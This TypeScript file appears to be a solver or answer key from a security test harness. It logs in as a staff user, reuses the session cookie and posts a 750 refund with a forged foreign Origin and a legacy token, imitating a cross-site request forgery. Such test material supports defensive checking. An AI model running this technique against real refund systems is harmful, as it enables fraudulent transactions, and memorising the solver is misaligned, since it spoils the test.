// Drive a refund from a cross-site context: reuse the staff session cookie but post from a foreign
// Origin with no session form token, the way a CSRF page in the victim's browser would.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const p = ctx.plan.personas.persona_a
  const loginRes = await fetch(ctx.origin + buildPath(ctx.plan, 'login'), {
    method: 'POST',
    redirect: 'manual',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email: p.email, password: p.password }),
  })
  const setCookies = typeof loginRes.headers.getSetCookie === 'function' ? loginRes.headers.getSetCookie() : []
  const cookie = setCookies.map((c) => c.split(';')[0]!).find((c) => c.startsWith('rb_sid='))
  if (!cookie) return
  const amountField = ctx.plan.params['bodyAmount'] ?? 'amount'
  const body = new URLSearchParams({ [amountField]: '750', token: 'legacy-console' }).toString()
  await fetch(ctx.origin + buildPath(ctx.plan, 'createRefund'), {
    method: 'POST',
    redirect: 'manual',
    headers: {
      'content-type': 'application/x-www-form-urlencoded',
      cookie,
      origin: 'https://evil.attacker.example',
    },
    body,
  })
}
